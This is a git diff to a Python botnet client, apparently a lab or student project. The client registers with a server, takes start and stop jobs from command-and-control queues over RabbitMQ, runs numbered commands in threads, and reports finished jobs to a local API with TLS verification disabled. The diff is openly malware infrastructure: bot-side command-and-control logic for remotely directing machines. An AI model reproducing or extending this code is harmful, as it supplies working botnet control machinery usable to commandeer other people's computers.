@@ -4,6 +4,10 @@ import time
 import threading
 import json
 import sys
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 class Client():
@@ -12,8 +16,9 @@ class Client():
         self.bot_registration_address = ('192.168.0.105', 5582)
         self.commands = {1: self.command1, 2: self.command2}
         self.event_controller = threading.Event()
-        self.botnet_id = "0"
-        self.bot_id = "0"
+        self.botnet_id = 0
+        self.bot_id = 0
+        self.botnet_job_id = 0
         self.c2server_ip = 'localhost'
         self.connection = pika.BlockingConnection(pika.ConnectionParameters(host=self.c2server_ip))
 
@@ -25,15 +30,15 @@ class Client():
             response = json.load(response)
             if response['status'] == 'failed':
                 raise Exception('Registration failed')
-            (self.botnet_id, self.bot_id) = (str(response['botnetId']), str(response['botId']))
+            (self.botnet_id, self.bot_id) = (response['botnetId'], response['botId'])
         except:
             print("[-] Registration failed")
             sys.exit()
 
 
     def listen_for_commands(self):
-        queue_name = "c2commands" + self.bot_id
-        exchange_name = "C2Commands" + self.botnet_id
+        queue_name = "c2commands" + str(self.bot_id)
+        exchange_name = "C2Commands" + str(self.botnet_id)
         channel = self.connection.channel()
         channel.exchange_declare(exchange=exchange_name, exchange_type='fanout')
         channel.queue_declare(queue=queue_name, exclusive=True)
@@ -43,19 +48,18 @@ class Client():
 
 
     def execute_command(self, ch, method, properties, body):
-        try:
-            body = body.decode()
-            job_data = json.loads(body)
-            job_action = job_data['jobAction']
-            command_id = job_data['commandId']
-            command_args = job_data['commandArgs']
-        except:
-            print("[-] Parsing of job failed")
-            return
-
-        if job_action == "stop":
+        print("[+] Got command")
+        body = body.decode()
+        job_data = json.loads(body)
+        print(job_data)
+        self.botnet_job_id = job_data['Id']
+        job_action = job_data['JobAction']
+        command_id = job_data['CommandId']
+        command_args = job_data['CommandArgument']
+        
+        if job_action == "Stop":
             self.stop_job()
-        elif job_action == "start":
+        elif job_action == "Start":
             command_function = self.commands[command_id]
             self.event_controller.set()
             thread = threading.Thread(target=command_function, args=(command_args,))
@@ -67,6 +71,7 @@ class Client():
     def stop_job(self):
         if self.event_controller.is_set():
             self.event_controller.clear()
+            self.botnet_job_id = 0
 
     
     def command_wrapper(command):
@@ -80,7 +85,9 @@ class Client():
 
     def finish_command(self, result):
         self.event_controller.clear()
-        self.send_result(result)
+        url = "https://localhost:44353/api/v1/BotnetJob/" + str(self.botnet_job_id)
+        requests.delete(url=url, verify=False)
+        self.botnet_job_id = 0
 
 
     def send_result(self, result):
@@ -112,6 +119,6 @@ class Client():
 if __name__ == "__main__":
     client = Client()
     #(client.botnet_id, client.bot_id) = client.register_bot()
-    client.botnet_id = "5"
-    client.bot_id = "2"
+    client.botnet_id = 1
+    client.bot_id = 1
     client.listen_for_commands()
